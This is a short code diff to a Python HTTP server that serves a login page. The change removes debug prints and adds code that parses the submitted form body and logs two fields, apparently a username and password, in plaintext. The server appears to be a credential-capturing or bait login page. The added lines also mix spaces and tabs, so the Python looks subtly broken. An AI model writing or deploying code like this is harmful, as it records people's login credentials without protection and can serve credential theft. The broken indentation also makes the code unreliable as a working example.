@@ -44,14 +44,13 @@ class HTTPHandler(SimpleHTTPRequestHandler):
 		content_length = int(self.headers.get('Content-Length', 0))
 		config_string = self.rfile.read(content_length).decode("UTF-8")
 
-		print("Content length: ", content_length)
-		print("Config string: [ ", config_string, " ]")
 		if self.path == '/login/':
 			self.path = '/login.html'
-			return SimpleHTTPRequestHandler.do_GET(self)
 
-		print("Content length: ", content_length)
-		print("Config string: [ ", config_string, " ]")
+            index1 = config_string.find('=')
+			index2 = config_string.find('&')
+			index3 = config_string.rfind('&')
+			http_get_logger.info(f'{config_string[index1+1:index2]}\t{config_string[index2+10:index3]}')
 		self.path='/login.html'
 		return SimpleHTTPRequestHandler.do_GET(self)
 
